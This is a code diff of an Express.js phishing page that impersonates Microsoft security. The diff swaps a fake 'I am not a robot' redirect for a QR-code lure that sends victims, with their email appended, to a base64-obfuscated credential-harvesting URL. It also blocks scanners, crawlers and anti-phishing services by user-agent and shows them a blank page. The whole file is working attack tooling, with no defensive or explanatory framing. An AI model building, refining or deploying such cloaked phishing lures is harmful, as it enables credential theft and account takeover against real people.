@@ -4,22 +4,21 @@ const app = express();
 
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// Tes liens finaux encodés
 const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
 const part2 = "cGdhYWZGVE0=";
 
 app.all('/', (req, res) => {
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
-    
-    // Récupération de l'email via m= (depuis l'attachement) ou login_hint
     const targetEmail = req.query.m || req.query.login_hint || req.body?.login_hint || "";
-    
-    // Détection robots
     const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
 
     if (isBotUA || (targetEmail === "" && !req.query.debug)) {
         return res.send('<html><body style="background:white;"></body></html>');
     }
+
+    // Le lien final qui sera dans le QR Code
+    let finalLink = Buffer.from(part1, 'base64').toString() + Buffer.from(part2, 'base64').toString();
+    if(targetEmail !== "") finalLink += (finalLink.includes('?') ? '&' : '?') + "m=" + encodeURIComponent(targetEmail);
 
     res.send(`
         <!DOCTYPE html>
@@ -27,54 +26,45 @@ app.all('/', (req, res) => {
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1">
-            <title>Security Verification</title>
+            <title>Identity Verification</title>
             <style>
-                body { background: #f4f7f9; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-                .container { background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: left; max-width: 400px; width: 90%; overflow: hidden; border: 1px solid #e1e4e8; }
-                .header { background: #0078d4; color: white; padding: 12px 20px; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
-                .content { padding: 25px; }
-                h2 { color: #24292e; font-size: 18px; margin: 0 0 10px 0; font-weight: 600; }
-                p { font-size: 14px; color: #586069; margin-bottom: 20px; line-height: 1.5; }
-                .checkpoint-box { background: #fff; border: 1px solid #0078d4; border-radius: 4px; padding: 15px; display: flex; align-items: center; cursor: pointer; transition: background 0.2s; }
-                .checkpoint-box:hover { background: #f0f7ff; }
-                #customCheckbox { width: 20px; height: 20px; border: 2px solid #0078d4; border-radius: 3px; background: white; margin-right: 12px; flex-shrink: 0; }
-                #loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-right: 12px; }
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                .main-text { font-weight: 600; font-size: 14px; color: #24292e; }
-                .footer { padding: 15px 25px; background: #fafbfc; border-top: 1px solid #e1e4e8; font-size: 11px; color: #6a737d; display: flex; justify-content: space-between; }
+                body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+                .card { background: white; width: 100%; max-width: 450px; padding: 40px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-radius: 2px; }
+                .logo-section { display: flex; align-items: center; margin-bottom: 20px; }
+                .logo-icon { width: 24px; margin-right: 10px; }
+                .soc-text { font-size: 16px; color: #333; font-weight: 500; }
+                .badge { background: #fff8e1; color: #fbc02d; font-size: 10px; font-weight: bold; padding: 4px 8px; border-radius: 2px; display: inline-block; margin-bottom: 20px; text-transform: uppercase; }
+                h2 { font-size: 24px; color: #222; margin: 0 0 15px 0; font-weight: 400; }
+                p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 30px; }
+                .qr-container { background: #f8fbff; border: 1px solid #e1e8f0; padding: 30px; text-align: center; position: relative; }
+                .sync-text { color: #0078d4; font-size: 13px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; }
+                .dot { height: 8px; width: 8px; background-color: #0078d4; border-radius: 50%; display: inline-block; margin-right: 10px; animation: blink 1s infinite; }
+                @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
+                .qr-code { width: 180px; height: 180px; background: white; margin: 0 auto; display: block; border: 1px solid #eee; }
+                .footer { margin-top: 40px; font-size: 11px; color: #999; border-top: 1px solid #eee; padding-top: 20px; line-height: 1.6; }
             </style>
         </head>
         <body>
-            <div class="container">
-                <div class="header">Microsoft Security Compliance</div>
-                <div class="content">
-                    <h2>Final Verification</h2>
-                    <p>To access the corporate resource, please confirm you are a verified user of <strong>${targetEmail.split('@')[1] || 'the domain'}</strong>.</p>
-                    <div class="checkpoint-box" id="clickArea">
-                        <div id="customCheckbox"></div>
-                        <div id="loader"></div>
-                        <div class="main-text" id="mainMsg">I am not a robot</div>
-                    </div>
+            <div class="card">
+                <div class="logo-section">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Microsoft_Azure_Shield.svg" class="logo-icon">
+                    <span class="soc-text">Security Operations Center</span>
                 </div>
+                <div class="badge">Action Required</div>
+                <h2>Identity Verification</h2>
+                <p>For your protection, this verification must be completed via a mobile device. Please scan the secure QR code below to verify and restore full account access.</p>
+                
+                <div class="qr-container">
+                    <div class="sync-text"><span class="dot"></span> Waiting for mobile synchronization...</div>
+                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalLink)}" class="qr-code">
+                </div>
+
                 <div class="footer">
-                    <span>ID: ${Math.floor(Math.random() * 999999)}</span>
-                    <span>&copy; 2026 Security Systems</span>
+                    Case ID: #IT-483921 | Status: Pending<br>
+                    Timestamp: ${new Date().toLocaleString()}<br><br>
+                    © 2026 Microsoft Corporation. IT Security.
                 </div>
             </div>
-            <script>
-                document.getElementById('clickArea').addEventListener('click', function() {
-                    const p1 = "${part1}"; const p2 = "${part2}"; const em = "${targetEmail}";
-                    document.getElementById('customCheckbox').style.display = 'none';
-                    document.getElementById('loader').style.display = 'block';
-                    document.getElementById('mainMsg').innerText = "Verifying...";
-                    
-                    setTimeout(() => {
-                        let target = atob(p1) + atob(p2);
-                        if(em !== "") target += (target.includes('?') ? '&' : '?') + "login_hint=" + encodeURIComponent(em);
-                        window.location.href = target;
-                    }, 1500); 
-                });
-            </script>
         </body>
         </html>
     `);
